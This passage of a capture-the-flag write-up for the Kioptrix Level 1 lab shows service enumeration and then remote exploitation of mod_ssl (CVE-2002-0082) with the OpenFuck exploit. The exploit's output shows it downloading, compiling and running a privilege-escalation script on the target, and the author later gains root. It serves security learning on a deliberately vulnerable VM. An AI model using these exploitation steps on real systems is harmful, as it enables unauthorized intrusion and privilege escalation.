IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
10.10.10.131     KIOPTRIX         <server>  KIOPTRIX         00:00:00:00:00:00

```

So far we have gathered basic information as follows:

| ip  | 10.10.10.131 |
| --- | --- |
| port | 22,80,443,139,111 |
| apache version | 1.3.20 |
| mod_ssl version | 2.8.4 |
| openssl version | 0.9.6b |
| http method | GET,HEAD,OPTIONS,TRACE |
| OS type | redhat |
| kernel version | Linux 2.4.9 - 2.4.18 |

# Exploitation

I will first dig deeper into the mod_ssl remote buffer overflow vulnerability, since it may get a remote shell.

The related CVE number is CVE-2002-0082.

Google it:

![](/img/posts/kioptrix-level-1-writeup-4.jpg)

Open the second one:

![](/img/posts/kioptrix-level-1-writeup-5.jpg)

We use the above exploit script.

It couldn't be compiled:

![](/img/posts/kioptrix-level-1-writeup-6.jpg)

I found an updated one in the comment:

![](/img/posts/kioptrix-level-1-writeup-7.jpg)

Try this one:

![](/img/posts/kioptrix-level-1-writeup-8.jpg)

Compiled successfully.

Exploiting:

```bash

└─$ ./OpenFuck 0x6b 10.10.10.131 443 -c 40                                                   1 ⨯

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8068
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--23:42:55--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!

Unable to establish SSL connection.

Unable to establish SSL connection.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c': No such file or directory
bash: ./exploit: No such file or directory
bash-2.05$ 
bash-2.05$ whoami
whoami
apache

```

It appears that I'm not root.

What could go wrong?

![](/img/posts/kioptrix-level-1-writeup-9.jpg)

When I check the output message again, during the exploit process it tried to connect to the url https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c but failed, and then tried to execute the script ./exploit which could not be found.

So I think the url is used to download that exploit script, and that script is for privilege escalation.

To verify my thought, I checked the source code and it contains the following lines:

![](/img/posts/kioptrix-level-1-writeup-10.jpg)

After gaining access to the system, it downloads the script, compile it and execute it.

I'm going to fix this exploit script. Here's what I thought. I'm going to download the exploit file by hand and put it on the attacker vm(my kali linux), and then after I run openfuck again, I download it from kali, execute it by hand on the target vm.

After getting shell, downloading exploit script from kali:

![](/img/posts/kioptrix-level-1-writeup-11.jpg)

Compiling:

![](/img/posts/kioptrix-level-1-writeup-12.jpg)

Exploiting:

![](/img/posts/kioptrix-level-1-writeup-13.jpg)


Nailed it! I'm root now.

We can also pretiffy the shell.

Google it:

![](/img/posts/kioptrix-level-1-writeup-14.jpg)

Try python tty:

![](/img/posts/kioptrix-level-1-writeup-15.jpg)

It looks like not working.

Try another one:

![](/img/posts/kioptrix-level-1-writeup-16.jpg)

Ok, this is it.